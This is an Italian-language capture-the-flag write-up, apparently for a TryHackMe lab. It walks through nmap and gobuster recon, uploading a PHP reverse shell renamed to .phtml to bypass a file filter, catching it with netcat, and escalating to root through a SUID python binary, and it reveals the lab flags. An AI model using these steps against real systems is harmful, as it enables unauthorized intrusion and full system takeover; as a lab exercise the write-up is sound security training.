@@ -1,0 +1,131 @@
+#
+sudo nmap -vv -sV -A 10.10.56.43
+
+10.10.42.95 INDIRIZZO IP BERSAGLIO 
+
+PRIMO PASSO: RECON
+Quindi scan con nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+| ssh-rsa 
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+| ecdsa-sha2-nistp256 
+|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+MAC Address: 02:52:99:A1:0C:73 (Unknown)
+
+===================================================================================================
+
+E via sul sito web, si prende gobuster, la nostra fidata wordlist e via!
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+root@ip-10-10-146-42:~# gobuster dir -u http://10.10.42.95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.42.95
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/05/23 23:51:49 Starting gobuster
+===============================================================
+/uploads (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/panel (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2023/05/23 23:52:12 Finished
+===============================================================
+
+vado a controllare le 4 directories subito.
+e quella interessante e "utile" sembrerebbe essere /panel
+e /uploads
+
+menomale a cristo che ho già preso appunti, perchè mi è crashata la VM (◣_◢)
+
+Dicevo, l'obiettivo è quello di usare la pagina per caricare file nel sito per caricare
+un file malizioso, una reverse shell (file creati con php, python, etc. che permette di ottenere controllo del sistema compromesso per creare una connessione stabilita dalla sessione.
+
+come si fa però?
+
+SECONDO STEP: LA REVERSE SHELL
+
+allora, una reverse shell .php è già presente a bordo, qui:
+/usr/share/webshells/php
+
+quindi la prendo, aggiungo l'IP a cui deve tornare (aka l'IP della mia AttackBox)
+e niente, noto che il sito non accetta file .php 
+							ʘ‿ʘ
+oh ma .phtml funge, lo accetta quindi ez
+(è bastato rinominare il file ovviamente e abbiamo bypassato un filtro per extension type)
+
+=================================================
+allora qui uso un comando per "ascoltare" la reverse shell, e dopo ho aperto il file dalla pagina /uploads "attivandola" 
+
+
+root@ip-10-10-146-221:~# nc -lnvp 1234
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from 10.10.42.95 32804 received!
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 23:34:57 up 58 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+Quindi ora siamo dentro! 
+	( ͡° ͜ʖ ͡°)
+
+in teoria ci ha spawnato nella directory /
+(conferma con pwd)
+teoricamente i file delle web app dovrebbero trovarsi in /var/www/
+
+$ cd /var/www
+$ ls
+html
+user.txt
+$ cat user.txt
+THM{y0u_g0t_a_sh3ll}
+
+===================================================================================================
+
+TERZO ULTIMO PASSO: PrivEsc
+
+Ora, i permessi SUID, consentono a un user di eseguire il programma con privilegi root.
+Easy vulnerabilità quindi!
+
+Ecco un comando per cercarli: 
+find / -user root -perm -4000 -print 2>/dev/null
+
+ecco che ne troviamo uno interessante al link:
+https://gtfobins.github.io/gtfobins/python/#:~:text=restricted%20file%20system.-,python%20%2Dc%20%27print(open(%22file_to_read%22).read())%27,-Library%20load
+
+ecco, è quello che ci serve per leggere un file con il privilegio di Python
+$ python -c 'print(open("/root/root.txt").read())'      
+THM{pr1v1l3g3_3sc4l4t10n}
+
+e ci da subito la nostra root flag
+-------------------------------------------------
+e se non conoscessimo il nome del file che ci serve?
+bene, siccome parlavo di SUID... ecco il link al comando preciso per ottenere il root:
+https://gtfobins.github.io/gtfobins/python/#:~:text=xs%20%24(which%20python)%20.-,./python%20%2Dc%20%27import%20os%3B%20os.execl(%22/bin/sh%22%2C%20%22sh%22%2C%20%22%2Dp%22)%27,-Sudo
+
+e il comando
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
